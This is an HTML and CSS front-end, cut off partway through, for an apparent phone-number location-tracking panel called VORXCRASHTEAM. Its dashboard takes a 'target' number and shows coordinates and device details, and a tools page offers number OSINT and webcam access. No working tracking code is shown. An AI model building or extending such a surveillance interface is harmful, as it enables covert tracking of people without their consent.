<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login - Track IP</title>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <!-- Leaflet CSS & JS (Peta) -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    
    <!-- Google Fonts (Elegant) -->
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

    <style>
        /* ======================================== */
        /* CSS YANG SUDAH ADA (TETAP)              */
        /* ======================================== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; min-height: 100vh; background: #0a0a1a; color: #fff; overflow: hidden; }
        #videoBgLogin { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; background: #0a0a1a; }
        #loginScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; z-index: 9999; padding: 20px; transition: opacity 0.6s ease; background: rgba(0,0,0,0.4); }
        #loginScreen.hidden { opacity: 0; pointer-events: none; }
        .login-card { background: rgba(255,255,255,0.05); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.08); border-radius: 28px; padding: 40px 30px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 40px 80px rgba(0,0,0,0.6); position: relative; z-index: 1; }
        .login-card .logo-icon { width: 80px; height: 80px; background: linear-gradient(135deg, rgba(0,212,255,0.15), rgba(123,47,252,0.15)); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; border: 1px solid rgba(255,255,255,0.08); }
        .login-card .logo-icon i { font-size: 36px; color: #00d4ff; animation: pulse 2s ease-in-out infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        .login-card .brand { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00d4ff, #7b2ffc, #ff6bcb); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; letter-spacing: 2px; margin-bottom: 4px; }
        .login-card .subtitle { color: rgba(255,255,255,0.3); font-size: 12px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 24px; }
        .login-card .input-group { display: flex; align-items: center; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); border-radius: 14px; padding: 0 16px; margin-bottom: 14px; transition: all 0.3s ease; }
        .login-card .input-group:focus-within { border-color: rgba(0,212,255,0.3); box-shadow: 0 0 30px rgba(0,212,255,0.05); }
        .login-card .input-group i { color: rgba(255,255,255,0.2); font-size: 16px; }
        .login-card .input-group input { width: 100%; padding: 16px 12px; background: transparent; border: none; outline: none; color: #fff; font-size: 15px; }
        .login-card .input-group input::placeholder { color: rgba(255,255,255,0.15); }
        .login-card .btn-login { width: 100%; padding: 16px; background: linear-gradient(135deg, #00d4ff, #7b2ffc); border: none; border-radius: 14px; color: #fff; font-size: 17px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; margin-top: 6px; position: relative; overflow: hidden; }
        .login-card .btn-login::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); transition: all 0.6s ease; }
        .login-card .btn-login:hover::before { left: 100%; }
        .login-card .btn-login:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,212,255,0.2); }
        .login-card .btn-login:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
        .login-card .btn-login .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .login-card .login-error { color: #ff6b6b; font-size: 13px; margin-top: 10px; display: none; }
        .login-card .login-error.show { display: block; }
        .login-card .footer-links { margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: center; gap: 20px; align-items: center; }
        .login-card .footer-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 13px; transition: color 0.3s ease; display: flex; align-items: center; gap: 6px; }
        .login-card .footer-links a:hover { color: #00d4ff; }
        .login-card .footer-links .telegram i { color: #0088cc; }
        .login-card .footer-links .wa i { color: #25D366; }
        .login-card .footer-copyright { margin-top: 12px; color: rgba(255,255,255,0.06); font-size: 10px; letter-spacing: 1px; }

        /* VIDEO INTRO */
        #videoIntroContainer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; display: none; background: #000; }
        #videoIntroContainer.show { display: block; }
        #videoIntro { width: 100%; height: 100%; object-fit: cover; }
        .intro-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10001; display: none; background: rgba(0,0,0,0.2); pointer-events: none; }
        .intro-overlay.show { display: block; }
        .intro-text-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10002; display: none; justify-content: center; align-items: center; flex-direction: column; pointer-events: none; }
        .intro-text-container.show { display: flex; }
        
        /* FONT ELEGANT UNTUK TULISAN INTRO */
        .intro-text-container .main-text { 
            font-size: 65px; 
            font-weight: 900; 
            font-family: 'Playfair Display', serif;
            font-style: italic;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc, #ff6bcb, #00d4ff);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientShift 3s ease-in-out infinite, textReveal 1.5s ease-out forwards;
            text-shadow: none;
            letter-spacing: 8px;
            text-transform: uppercase;
            transform: scale(0.8);
            opacity: 0;
            position: relative;
            margin-bottom: 10px;
        }
        
        /* Efek abstrak/glitch pada teks */
        .intro-text-container .main-text::before {
            content: 'VORXCRASHTEAM';
            position: absolute;
            top: -2px;
            left: -2px;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc, #ff6bcb, #00d4ff);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: glitch 0.3s ease-in-out infinite alternate;
            clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
            opacity: 0.5;
            text-shadow: 4px 4px 20px rgba(0,212,255,0.3);
        }
        
        .intro-text-container .main-text::after {
            content: 'VORXCRASHTEAM';
            position: absolute;
            bottom: -2px;
            right: -2px;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc, #ff6bcb, #00d4ff);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: glitch2 0.4s ease-in-out infinite alternate;
            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
            opacity: 0.5;
            text-shadow: -4px -4px 20px rgba(123,47,252,0.3);
        }
        
        @keyframes glitch { 0% { transform: translate(-2px, -2px) skewX(-2deg); } 100% { transform: translate(2px, 2px) skewX(2deg); } }
        @keyframes glitch2 { 0% { transform: translate(2px, 2px) skewX(2deg); } 100% { transform: translate(-2px, -2px) skewX(-2deg); } }
        @keyframes textReveal { 0% { transform: scale(0.8); opacity: 0; filter: blur(10px); } 100% { transform: scale(1); opacity: 1; filter: blur(0px); } }
        @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        
        /* Teks kecil di bawah */
        .intro-text-container .sub-text { 
            color: rgba(255,255,255,0.5); 
            font-size: 14px; 
            letter-spacing: 4px; 
            text-transform: uppercase; 
            margin-top: 0px; 
            opacity: 0; 
            animation: fadeUp 1.5s ease-out 0.5s forwards; 
            font-weight: 300; 
            font-family: 'Inter', sans-serif;
            text-shadow: 0 0 30px rgba(0,212,255,0.1);
        }
        
        .intro-text-container .sub-text-extra {
            color: rgba(255,255,255,0.2);
            font-size: 11px;
            letter-spacing: 6px;
            text-transform: uppercase;
            margin-top: 4px;
            opacity: 0;
            animation: fadeUp 1.5s ease-out 0.8s forwards;
            font-weight: 300;
            font-family: 'Inter', sans-serif;
        }
        
        @keyframes fadeUp { 0% { transform: translateY(30px); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
        
        /* Tombol Skip */
        .btn-skip { position: fixed; top: 20px; right: 20px; z-index: 10003; padding: 10px 24px; background: rgba(255,255,255,0.08); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; color: rgba(255,255,255,0.6); font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; display: none; letter-spacing: 1px; pointer-events: auto; }
        .btn-skip.show { display: block; }
        .btn-skip:hover { background: rgba(255,255,255,0.15); color: #fff; border-color: rgba(255,255,255,0.2); transform: scale(1.05); }
        .btn-skip i { margin-right: 6px; }

        /* ======================================== */
        /* DASHBOARD - DENGAN BOTTOM NAV          */
        /* ======================================== */
        #dashboard { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9998; background: #0a0a1a; overflow-y: auto; }
        #dashboard.visible { display: block; }
        
        .header { background: rgba(10, 10, 26, 0.95); backdrop-filter: blur(20px); padding: 14px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); position: sticky; top: 0; z-index: 100; }
        .header-left { display: flex; align-items: center; gap: 14px; }
        .header-left .logo { font-size: 22px; font-weight: 800; background: linear-gradient(135deg, #00d4ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header-left .status-dot { width: 10px; height: 10px; background: #00ff88; border-radius: 50%; animation: blink 1s ease-in-out infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
        .header-left .status-text { font-size: 11px; color: rgba(255,255,255,0.3); font-weight: 500; }
        .header-right { display: flex; align-items: center; gap: 16px; }
        .header-right .badge { background: rgba(0, 212, 255, 0.1); padding: 4px 14px; border-radius: 20px; font-size: 10px; color: #00d4ff; border: 1px solid rgba(0, 212, 255, 0.1); font-weight: 600; letter-spacing: 0.5px; }
        .header-right .time { font-size: 12px; color: rgba(255,255,255,0.2); font-weight: 300; }

        .main { display: flex; flex-direction: column; height: calc(100vh - 65px - 65px); padding: 12px; gap: 12px; }
        @media (min-width: 768px) { .main { flex-direction: row; padding: 16px; gap: 16px; } .sidebar { width: 380px; flex-shrink: 0; max-height: calc(100vh - 100px - 65px); } .map-container { flex: 1; } }
        
        .sidebar { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 20px; overflow-y: auto; }
        .sidebar-title { font-size: 12px; font-weight: 600; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 16px; }
        .sidebar-title i { margin-right: 8px; color: rgba(0,212,255,0.4); }
        
        .input-group { display: flex; gap: 10px; margin-bottom: 12px; }
        .input-group input { flex: 1; padding: 14px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; color: #fff; font-size: 15px; outline: none; transition: all 0.3s ease; }
        .input-group input:focus { border-color: rgba(0, 212, 255, 0.3); box-shadow: 0 0 20px rgba(0, 212, 255, 0.05); }
        .input-group input::placeholder { color: rgba(255,255,255,0.15); }
        .input-group button { padding: 14px 24px; background: linear-gradient(135deg, #00d4ff, #7b2ffc); border: none; border-radius: 12px; color: #fff; font-weight: 700; cursor: pointer; transition: all 0.3s ease; white-space: nowrap; font-size: 14px; display: flex; align-items: center; gap: 8px; }
        .input-group button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0, 212, 255, 0.2); }
        .input-group button:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; box-shadow: none !important; }
        .input-group button .spinner-btn { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; }
        
        .hint-text { font-size: 11px; color: rgba(255,255,255,0.12); margin-bottom: 16px; }
        .hint-text i { margin-right: 4px; }
        
        .info-panel { background: rgba(255,255,255,0.02); border-radius: 12px; padding: 16px; margin-top: 12px; border: 1px solid rgba(255,255,255,0.03); display: none; }
        .info-panel.active { display: block; animation: fadeSlide 0.4s ease; }
        @keyframes fadeSlide { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .info-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.03); }
        .info-header .title { font-weight: 600; color: #00d4ff; font-size: 14px; }
        .info-header .title i { margin-right: 8px; }
        .info-header .status-badge { font-size: 11px; padding: 4px 12px; border-radius: 20px; font-weight: 600; }
        .status-badge.online { background: rgba(0, 255, 136, 0.1); color: #00ff88; border: 1px solid rgba(0, 255, 136, 0.1); }
        .status-badge.offline { background: rgba(255, 0, 0, 0.1); color: #ff6b6b; border: 1px solid rgba(255, 0, 0, 0.1); }
        .status-badge.waiting { background: rgba(255, 217, 61, 0.1); color: #ffd93d; border: 1px solid rgba(255, 217, 61, 0.1); }
        
        .info-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 13px; border-bottom: 1px solid rgba(255,255,255,0.02); }
        .info-row:last-child { border-bottom: none; }
        .info-row .label { color: rgba(255,255,255,0.3); }
        .info-row .value { color: rgba(255,255,255,0.8); font-weight: 500; font-size: 13px; }
        .info-row .value.lat { color: #00d4ff; }
        .info-row .value.lng { color: #7b2ffc; }
        
        .map-container { background: rgba(255,255,255,0.02); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); overflow: hidden; position: relative; min-height: 300px; }
        #map { width: 100%; height: 100%; min-height: 400px; }
        .map-loading { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: rgba(255,255,255,0.2); font-size: 14px; text-align: center; z-index: 1; pointer-events: none; }
        .map-loading i { font-size: 30px; display: block; margin-bottom: 10px; color: rgba(0,212,255,0.2); }

        /* ======================================== */
        /* BOTTOM NAVIGATION BAR                   */
        /* ======================================== */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 65px;
            background: rgba(10, 10, 26, 0.95);
            backdrop-filter: blur(20px);
            border-top: 1px solid rgba(255,255,255,0.05);
            display: none;
            z-index: 9999;
            justify-content: space-around;
            align-items: center;
            padding: 0 10px;
        }
        
        .bottom-nav.visible { display: flex; }
        
        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: rgba(255,255,255,0.2);
            font-size: 10px;
            text-decoration: none;
            transition: all 0.3s ease;
            padding: 5px 12px;
            border-radius: 12px;
            cursor: pointer;
            background: transparent;
            border: none;
            position: relative;
            min-width: 55px;
        }
        
        .nav-item i {
            font-size: 20px;
            margin-bottom: 2px;
            transition: all 0.3s ease;
        }
        
        .nav-item span {
            font-size: 9px;
            letter-spacing: 0.5px;
            font-weight: 500;
        }
        
        .nav-item:hover { color: rgba(255,255,255,0.5); }
        .nav-item.active { color: #00d4ff; }
        .nav-item.active i { transform: translateY(-2px); text-shadow: 0 0 20px rgba(0,212,255,0.3); }
        
        .nav-item .badge-nav {
            position: absolute;
            top: -2px;
            right: -2px;
            width: 8px;
            height: 8px;
            background: #00ff88;
            border-radius: 50%;
            animation: blink 1s ease-in-out infinite;
        }

        /* ======================================== */
        /* TOOLS PAGE                              */
        /* ======================================== */
        #toolsPage {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9997;
            background: #0a0a1a;
            overflow-y: auto;
            padding-top: 20px;
            padding-bottom: 80px;
        }
        
        #toolsPage.visible { display: block; }
        
        .tools-header {
            padding: 20px 24px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            margin-bottom: 20px;
        }
        
        .tools-header h2 {
            font-size: 22px;
            font-weight: 700;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .tools-header p {
            color: rgba(255,255,255,0.3);
            font-size: 13px;
            margin-top: 4px;
        }
        
        .tools-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
            padding: 0 16px;
        }
        
        @media (max-width: 480px) {
            .tools-grid { grid-template-columns: 1fr; }
        }
        
        .tool-card {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 16px;
            padding: 20px 16px;
            text-align: center;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        
        .tool-card:hover {
            transform: translateY(-4px);
            border-color: rgba(0,212,255,0.2);
            box-shadow: 0 10px 40px rgba(0,212,255,0.05);
        }
        
        .tool-card .icon-circle {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, rgba(0,212,255,0.1), rgba(123,47,252,0.1));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        
        .tool-card .icon-circle i {
            font-size: 22px;
            color: #00d4ff;
        }
        
        .tool-card h4 {
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .tool-card p {
            color: rgba(255,255,255,0.25);
            font-size: 11px;
            line-height: 1.4;
        }

        /* ======================================== */
        /* TOOL CONTENT (Pop-up / Modal)          */
        /* ======================================== */
        .tool-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 99999;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .tool-modal.show { display: flex; }
        
        .tool-modal-content {
            background: rgba(20,20,40,0.95);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 24px;
            padding: 30px 24px;
            max-width: 420px;
            width: 100%;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .tool-modal-content .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }
        
        .tool-modal-content .modal-header h3 {
            color: #fff;
            font-size: 18px;
            font-weight: 700;
        }
        
        .tool-modal-content .modal-header .close-modal {
            background: rgba(255,255,255,0.05);
            border: none;
            color: rgba(255,255,255,0.3);
            width: 32px;
            height: 32px;
            border-radius: 50%;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .tool-modal-content .modal-header .close-modal:hover {
            background: rgba(255,0,0,0.1);
            color: #ff6b6b;
        }
        
        .tool-modal-content .tool-input-group {
            margin-bottom: 12px;
        }
        
        .tool-modal-content .tool-input-group label {
            display: block;
            color: rgba(255,255,255,0.3);
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 6px;
        }
        
        .tool-modal-content .tool-input-group input,
        .tool-modal-content .tool-input-group textarea {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
        }
        
        .tool-modal-content .tool-input-group input:focus,
        .tool-modal-content .tool-input-group textarea:focus {
            border-color: rgba(0,212,255,0.3);
        }
        
        .tool-modal-content .tool-input-group textarea {
            min-height: 80px;
            resize: vertical;
        }
        
        .tool-modal-content .btn-tool-action {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 6px;
        }
        
        .tool-modal-content .btn-tool-action:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0,212,255,0.2);
        }
        
        .tool-modal-content .result-area {
            margin-top: 14px;
            padding: 14px;
            background: rgba(255,255,255,0.02);
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.03);
            color: rgba(255,255,255,0.6);
            font-size: 13px;
            max-height: 200px;
            overflow-y: auto;
            display: none;
        }
        
        .tool-modal-content .result-area.show { display: block; }
        
        .tool-modal-content .result-area .result-item {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.03);
        }
        
        .tool-modal-content .result-area .result-item:last-child { border-bottom: none; }
        .tool-modal-content .result-area .result-item .label { color: rgba(255,255,255,0.3); font-size: 11px; }
        .tool-modal-content .result-area .result-item .value { color: #fff; font-weight: 500; }

        /* Webcam live */
        #webcamVideo {
            width: 100%;
            max-height: 300px;
            border-radius: 12px;
            background: #000;
            margin: 10px 0;
            object-fit: cover;
        }

        /* Toast */
        .toast { position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%) translateY(100px); background: rgba(10, 10, 26, 0.95); backdrop-filter: blur(20px); padding: 14px 28px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.06); color: #fff; font-size: 14px; z-index: 99999; opacity: 0; transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55); text-align: center; max-width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.5); pointer-events: none; }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .toast.success i { color: #00ff88; }
        .toast.error i { color: #ff6b6b; }
        .toast.warning i { color: #ffd93d; }
        .toast.info i { color: #00d4ff; }

        .sidebar::-webkit-scrollbar { width: 3px; }
        .sidebar::-webkit-scrollbar-track { background: transparent; }
        .sidebar::-webkit-scrollbar-thumb { background: rgba(0, 212, 255, 0.15); border-radius: 10px; }

        @media (max-width: 768px) {
            .header { padding: 10px 16px; }
            .header-left .logo { font-size: 18px; }
            .header-right .badge { font-size: 9px; padding: 3px 10px; }
            .header-right .time { font-size: 10px; }
            .sidebar { max-height: 300px; }
            #map { min-height: 300px; }
            .input-group { flex-wrap: wrap; }
            .input-group button { width: 100%; justify-content: center; }
            .intro-text-container .main-text { font-size: 32px; letter-spacing: 4px; }
            .tools-grid { grid-template-columns: 1fr; }
        }
        
        @media (max-width: 480px) {
            .main { padding: 8px; gap: 8px; }
            .sidebar { padding: 14px; }
            .info-row { font-size: 12px; padding: 5px 0; }
            .login-card { padding: 30px 20px; }
            .intro-text-container .main-text { font-size: 24px; letter-spacing: 2px; }
            .intro-text-container .sub-text { font-size: 12px; letter-spacing: 3px; }
            .bottom-nav { height: 55px; }
            .nav-item { font-size: 9px; min-width: 45px; }
            .nav-item i { font-size: 17px; }
        }
    </style>
</head>
<body>

    <!-- ======================================== -->
    <!-- VIDEO BACKGROUND LOGIN (TANPA SUARA) -->
    <!-- ======================================== -->
    <video id="videoBgLogin" autoplay loop muted playsinline>
        <source src="bg_video.mp4" type="video/mp4">
    </video>

    <!-- ======================================== -->
    <!-- LAYAR LOGIN -->
    <!-- ======================================== -->
    <div id="loginScreen">
        <div class="login-card">
            <div class="logo-icon">
                <i class="fas fa-shield-halved"></i>
            </div>
            <div class="brand">TRACK LOCATION</div>
            <p class="subtitle">BY VLZZ • SISTEM PELACAKAN REAL-TIME</p>

            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" id="usernameInput" placeholder="Username" autocomplete="off">
            </div>

            <div class="input-group">
                <i class="fas fa-lock"></i>
                <input type="password" id="passwordInput" placeholder="Password">
            </div>

            <div class="login-error" id="loginError">❌ Username atau password salah!</div>

            <button class="btn-login" id="loginBtn">
                <i class="fas fa-sign-in-alt"></i> KONFIRMASI
            </button>

            <div class="footer-links">
                <a href="https://t.me/vlzzstecu" target="_blank" class="telegram">
                    <i class="fab fa-telegram-plane"></i> Telegram
                </a>
                <a href="https://wa.me/6283184214399" target="_blank" class="wa">
                    <i class="fab fa-whatsapp"></i> WhatsApp
                </a>
            </div>

            <div class="footer-copyright">
                vlzzproject@2026
            </div>
        </div>
    </div>

    <!-- ======================================== -->
    <!-- VIDEO INTRO (DENGAN SUARA) - TIMER 0:20 -->
    <!-- ======================================== -->
    <div id="videoIntroContainer">
        <video id="videoIntro" playsinline>
            <source src="intro_video.mp4" type="video/mp4">
        </video>
    </div>

    <div class="intro-overlay" id="introOverlay"></div>

    <div class="intro-text-container" id="introTextContainer">
        <div class="main-text">VORXCRASHTEAM</div>
        <div class="sub-text">MELACAK LOKASI DENGAN AKURAT</div>
        <div class="sub-text-extra">JANGAN LUPA MANDI</div>
    </div>

    <button class="btn-skip" id="btnSkip">
        <i class="fas fa-forward"></i> SKIP
    </button>

    <!-- ======================================== -->
    <!-- DASHBOARD                               -->
    <!-- ======================================== -->
    <div id="dashboard">
        <div class="header">
            <div class="header-left">
                <span class="logo">TRACK LOCATION</span>
                <span class="status-dot"></span>
                <span class="status-text">Live Monitoring</span>
            </div>
            <div class="header-right">
                <span class="badge"><i class="fas fa-shield-alt"></i> Resmi</span>
                <span class="time" id="timeDisplay"></span>
            </div>
        </div>

        <div class="main">
            <div class="sidebar">
                <div class="sidebar-title">
                    <i class="fas fa-search"></i> Lacak Target
                </div>

                <div class="input-group">
                    <input type="text" id="phoneInput" placeholder="81234567890" maxlength="13" autocomplete="off">
                    <button id="trackBtn"><i class="fas fa-location-dot"></i> Lacak</button>
                </div>

                <div class="hint-text">
                    <i class="fas fa-info-circle"></i> Masukkan nomor tanpa 62 (contoh: 81234567890)
                </div>

                <div class="info-panel" id="infoPanel">
                    <div class="info-header">
                        <span class="title"><i class="fas fa-satellite-dish"></i> Status Target</span>
                        <span class="status-badge waiting" id="statusBadge">⏳ Menunggu</span>
                    </div>
                    <div class="info-row">
                        <span class="label">Nomor</span>
                        <span class="value" id="displayPhone">-</span>
                    </div>
                    <div class="info-row">
                        <span class="label">Latitude</span>
                        <span class="value lat" id="displayLat">-</span>
                    </div>
                    <div class="info-row">
                        <span class="label">Longitude</span>
                        <span class="value lng" id="displayLng">-</span>
                    </div>
                    <div class="info-row">
                        <span class="label">Akurasi</span>
                        <span class="value" id="displayAccuracy">-</span>
                    </div>
                    <div class="info-row">
                        <span class="label">Terakhir Update</span>
                        <span class="value" id="displayTime">-</span>
                    </div>
                    <div class="info-row">
                        <span class="label">Device</span>
                        <span class="value" id="displayDevice" style="font-size: 11px; max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">-</span>
                    </div>
                </div>

                <div style="margin-top: 14px; padding: 12px; background: rgba(255,0,0,0.02); border-radius: 10px; border: 1px solid rgba(255,0,0,0.04);">
                    <div style="font-size: 10px; color: rgba(255,255,255,0.15); text-align: center; line-height: 1.6;">
                        <i class="fas fa-shield-halved" style="color: rgba(255,107,107,0.3);"></i>
                        Sistem ini beroperasi dengan 100% akurat<br>
                        dan tolong untuk tidak di salah gunakan
                    </div>
                </div>
            </div>

            <div class="map-container">
                <div class="map-loading" id="mapLoading">
                    <i class="fas fa-map"></i>
                    <span>Memuat Peta...</span>
                </div>
                <div id="map"></div>
            </div>
        </div>
    </div>

    <!-- ======================================== -->
    <!-- BOTTOM NAVIGATION BAR                   -->
    <!-- ======================================== -->
    <div class="bottom-nav" id="bottomNav">
        <button class="nav-item active" data-page="track" id="navTrack">
            <i class="fas fa-location-dot"></i>
            <span>Track</span>
        </button>
        <button class="nav-item" data-page="tools" id="navTools">
            <i class="fas fa-tools"></i>
            <span>Tools</span>
            <span class="badge-nav"></span>
        </button>
        <button class="nav-item" data-page="profile" id="navProfile">
            <i class="fas fa-user"></i>
            <span>Profile</span>
        </button>
    </div>

    <!-- ======================================== -->
    <!-- TOOLS PAGE                              -->
    <!-- ======================================== -->
    <div id="toolsPage">
        <div class="tools-header">
            <h2><i class="fas fa-tools" style="margin-right: 10px; color: #00d4ff;"></i>Tools</h2>
            <p>Pilih tools yang ingin digunakan</p>
        </div>
        
        <div class="tools-grid">
            <!-- Tool 1: Spotify -->
            <div class="tool-card" data-tool="spotify">
                <div class="icon-circle"><i class="fab fa-spotify"></i></div>
                <h4>Cari Lagu</h4>
                <p>Cari lagu di Spotify</p>
            </div>
            
            <!-- Tool 2: OSINT Nomor -->
            <div class="tool-card" data-tool="osint">
                <div class="icon-circle"><i class="fas fa-search"></i></div>
                <h4>OSINT Nomor</h4>
                <p>Cari data publik dari nomor</p>
            </div>
            
            <!-- Tool 3: Webcam -->
            <div class="tool-card" data-tool="webcam">
                <div class="icon-circle"><i class="fas fa-video"></i></div>
                <h4>Webcam</h4>
                <p>Akses kamera dengan izin</p>
            </div>
            
            <!-- Tool 4: WiFi Info -->
            <div class="tool-card" data-tool="wifi">
                <div class="icon-circle"><i class="fas fa-wifi"></i></div>
                <h4>WiFi Info</h4>
                <p>Informasi jaringan WiFi</p>
            </div>
        </div>
        
        <div style="padding: 16px; text-align: center; color: rgba(255,255,255,0.08); font-size: 10px; margin-top: 10px;">
            <i class="fas fa-shield-alt"></i> Sistem Resmi • vlzzproject@2026
        </div>
    </div>

    <!-- ======================================== -->
    <!-- TOOL MODALS                             -->
    <!-- ======================================== -->
    <!-- Modal Spotify -->
    <div class="tool-modal" id="modalSpotify">
        <div class="tool-modal-content">
            <div class="modal-header">
                <h3><i class="fab fa-spotify" style="color: #1DB954; margin-right: 8px;"></i>Cari Lagu</h3>
                <button class="close-modal" onclick="closeModal('modalSpotify')">&times;</button>
            </div>
            <div class="tool-input-group">
